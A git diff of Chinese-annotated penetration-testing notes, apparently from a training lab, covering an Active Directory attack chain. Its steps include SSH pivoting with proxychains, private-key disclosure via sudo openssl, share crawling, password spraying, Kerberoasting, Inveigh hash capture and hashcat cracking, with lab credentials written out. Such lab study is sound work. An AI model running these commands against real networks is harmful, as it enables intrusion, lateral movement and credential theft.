@@ -225,7 +225,7 @@ srvadm@dmz01:~$ sudo /usr/bin/openssl enc -in $LFILE      屏显私钥
 chmod 600 dmz01_key
 ssh -i dmz01_key root@10.129.203.111
 
-ssh -D 8081 -i dmz01_key root@10.129.203.111      从攻击机8081端口访问跳板机，再访问内网
+ssh -D 8081 -i dmz01_key root@10.129.203.111      从攻击机8081端口访问跳板机，再访问内网，proxychians 使用
 netstat -antp | grep 8081      查看攻击网络
 sudo vim /etc/proxychains.conf
 添加：socks4 127.0.0.1 8081 到 proxylist
@@ -374,10 +374,11 @@ bloodhound      打开GUI
 使用 PowerView 来更改 ssmalls 的密码
 ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111            本地 13389 -> 枢纽 3389 -> 目标  （仅一个目标）      本地 -> 远程单一
   对比
-  ssh -i dmz01_key -D 1080 root@10.129.203.111                             本地 13389 -> 枢纽 任意 -> 目标  （整个内网）        本地 -> 任意
-  ssh -i dmz01_key -R 8080:127.0.0.1:80 root@10.129.203.111                枢纽 8080 -> 本地 80                               远程 -> 本地
+ssh -i dmz01_key -D 1080 root@10.129.203.111                              本地 13389 -> 枢纽 任意 -> 目标  （整个内网）        本地 -> 任意
+  ssh -i dmz01_key -R 8080:127.0.0.1:80 root@10.129.203.111               枢纽 8080 -> 本地 80                               远程 -> 本地
 
 xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:remoteHome,"/home/local/tools"      把本地目录挂载为远程会话中的共享盘
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1      下载工具
 c:\DotNetNuke\Portals\0> net use      查看当前远程目录
 c:\DotNetNuke\Portals\0> copy \\TSCLIENT\remoteHome\PowerView.ps1 .      把 /home/tester/tools/PowerView.ps1 复制到远程当前目录
 更改密码
@@ -392,17 +393,19 @@ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!      用 ssm
 
 用  Snaffler 搜刮
   https://github.com/SnaffCon/Snaffler
-c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\Snaffler.exe      传输工具
-c:\DotNetNuke\Portals\0> Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data      搜刮
-proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'      另一种搜刮
+wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.44/Snaffler.exe                    下载工具
+c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\Snaffler.exe      把 /home/tester/tools/Snaffler.exe  复制到远程当前目录
+c:\DotNetNuke\Portals\0> Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data      搜刮，发现 'Department Shares'
+sudo proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'       搜刮 'Department Shares'
   https://www.netexec.wiki/smb-protocol/spidering-shares
 cat 172.16.8.3.json      查看结果
 proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares'       连接共享
 下载可疑文件
 smb: \IT\Private\> cd Development\
 smb: \IT\Private\Development\> ls
-smb: \IT\Private\Development\> get "SQL Express Backup.ps1" 
-无对应账户，可能只是旧密码，可以密码喷洒
+smb: \IT\Private\Development\> get "SQL Express Backup.ps1"
+cat IT\\Private\\Development\\SQL\ Express\ Backup.ps1
+有密码无账户，可能只是旧密码，可以密码喷洒
 C:\DotNetNuke\Portals\0> Invoke-DomainPasswordSpray -Password Welcome1
 没有有趣的访问权限，仍值得记录名为 Weak Active Directory Passwords（允许使用弱活动目录密码）
 访问域控制器的 SYSVOL 共享目录，在其中搜索 registry.xml 文件，目的是提取组策略首选项（GPP）里可能明文保存的自动登录用户名和密码
@@ -412,7 +415,8 @@ Kerberoasting
 C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1
 C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN |Select samaccountname      查 SPN 账户
 C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation      下载哈希成 csv
-hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt      破解
+  或者  sudo proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/hporter -request -outputfile ilfreight_spns
+hashcat -O -w 3 -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt      破解
 该帐户似乎没什么帮助，仍然可以记录下名为 Weak Kerberos Authentication Configuration (Kerberoasting)（弱 Kerberos 身份验证配置 (Kerberoasting)）
 
 C:\DotNetNuke\Portals\0> Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}      在 description 找密码
@@ -453,6 +457,10 @@ C:\Users\ilfserveradm> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows 
 c:\Users\ilfserveradm\Documents> lazagne.exe browsers -firefox      找 firefox 里的凭证
 
 一旦在主机上获得了本地管理员权限，值得运行 Inveigh，看看是否能获取任何用户的密码哈希
+wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
+传输到目标
 C:\Users\ilfserveradm\Documents> Import-Module .\Inveigh.ps1
 C:\Users\ilfserveradm\Documents> Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
+复制哈希到 hash 文件
+hashcat -m 5600 -O -w 3 hash /usr/share/wordlists/rockyou.txt.gz
 
